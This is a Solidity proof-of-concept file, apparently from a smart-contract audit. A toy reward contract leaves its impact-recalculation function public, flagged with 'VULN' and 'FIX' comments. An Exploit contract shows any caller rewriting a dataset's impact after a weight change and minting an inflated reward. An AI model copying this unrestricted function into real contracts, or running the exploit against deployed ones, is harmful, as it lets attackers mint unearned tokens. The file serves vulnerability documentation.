// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract RewardToken { mapping(address => uint256) public balanceOf; function mint(address to, uint256 amount) external { balanceOf[to] += amount; } }
contract ServiceNft {
    RewardToken public reward;
    address public admin;
    uint256 public datasetImpactWeight;
    mapping(uint256 => uint256) public datasetOf;
    mapping(uint256 => uint256) public raw;
    mapping(uint256 => uint256) internal _impacts;
    mapping(uint256 => address) public datasetOwner;
    constructor(RewardToken r) { reward = r; admin = msg.sender; }
    function setDatasetImpactWeight(uint256 weight) external { require(msg.sender == admin); datasetImpactWeight = weight; }
    function configure(uint256 proposalId, uint256 datasetId, uint256 rawImpact, address owner) external { require(msg.sender == admin); datasetOf[proposalId]=datasetId; raw[proposalId]=rawImpact; datasetOwner[datasetId]=owner; }
    function updateImpact(uint256 virtualId, uint256 proposalId) public {
        virtualId;
        uint256 datasetId = datasetOf[proposalId]; uint256 rawImpact = raw[proposalId];
        if (datasetId > 0) {
            _impacts[datasetId] = (rawImpact * datasetImpactWeight) / 10000; // @> VULN: any caller can rewrite reward-bearing impact after governance changes the weight
            _impacts[proposalId] = rawImpact - _impacts[datasetId];
            // FIX: make updateImpact internal or restrict it to the governance mint flow.
        }
    }
    function getImpact(uint256 id) external view returns (uint256) { return _impacts[id]; }
    function claimDataset(uint256 datasetId) external { reward.mint(datasetOwner[datasetId], _impacts[datasetId]); }
}
contract PublicCaller { function recompute(ServiceNft service, uint256 proposalId) external { service.updateImpact(1, proposalId); } }
contract Exploit {
    RewardToken public reward; ServiceNft public service; PublicCaller public caller;
    uint256 public baselineImpact; uint256 public attackerImpact;
    constructor() { reward = new RewardToken(); service = new ServiceNft(reward); caller = new PublicCaller(); }
    function run() external {
        service.setDatasetImpactWeight(2000); service.configure(101, 9, 100, address(this)); service.updateImpact(1, 101);
        baselineImpact = service.getImpact(9);
        service.setDatasetImpactWeight(9000);
        caller.recompute(service, 101);
        attackerImpact = service.getImpact(9);
        service.claimDataset(9);
        require(baselineImpact == 20 && attackerImpact == 90, "impact not rewritten");
        require(reward.balanceOf(address(this)) == 90, "unfair reward not minted");
    }
}
